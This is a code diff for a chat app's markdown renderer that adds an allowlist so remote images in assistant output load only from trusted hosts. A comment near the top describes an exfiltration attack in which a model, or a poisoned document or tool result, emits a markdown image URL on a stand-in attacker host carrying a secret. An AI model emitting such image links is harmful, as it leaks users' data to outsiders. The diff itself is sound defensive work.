@@ -11,6 +11,31 @@ interface Props {
   content: string
 }
 
+// Assistant output can embed images via markdown `![](url)`. Auto-loading an
+// arbitrary remote URL turns the renderer into a data-exfil beacon — a model
+// (or a poisoned doc/tool-result it summarizes) emits
+// `![](https://attacker.example/track?d=<secret>)` and the webview fires the GET
+// on render, no script needed. So only auto-load from hosts we already trust
+// (the same set the CSP img-src pins); anything else becomes a click-to-open
+// link instead of a silent fetch. Belt-and-suspenders with the pinned CSP.
+function isTrustedImageSrc(src: string): boolean {
+  if (src.startsWith('data:image/')) return true
+  if (src.startsWith('blob:')) return true
+  let u: URL
+  try {
+    u = new URL(src)
+  } catch {
+    return false
+  }
+  if (u.protocol !== 'https:' && u.protocol !== 'http:') return false
+  const h = u.hostname.toLowerCase()
+  if (h === 'localhost' || h === '127.0.0.1') return true // local engine previews
+  if (h === 'lrrhheztdytyfpizvuup.supabase.co') return true // LU cloud storage
+  if (h === 'civitai.com' || h.endsWith('.civitai.com')) return true
+  if (h.endsWith('.githubusercontent.com')) return true
+  return false
+}
+
 const components: Components = {
   code({ className, children, ...props }) {
     const match = /language-(\w+)/.exec(className || '')
@@ -71,6 +96,22 @@ const components: Components = {
         className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer inline"
       >
         {children}
+      </button>
+    )
+  },
+  img({ src, alt }) {
+    const s = typeof src === 'string' ? src : ''
+    if (s && isTrustedImageSrc(s)) {
+      return <img src={s} alt={alt ?? ''} loading="lazy" className="max-w-full rounded-md my-2" />
+    }
+    // Untrusted host — do not silently fetch. Offer an explicit click instead.
+    return (
+      <button
+        onClick={(e) => { e.preventDefault(); if (s) openExternal(s) }}
+        className="text-blue-600 dark:text-blue-400 hover:underline cursor-pointer inline"
+        title={s}
+      >
+        🖼 {alt || 'image'} (click to open)
       </button>
     )
   },
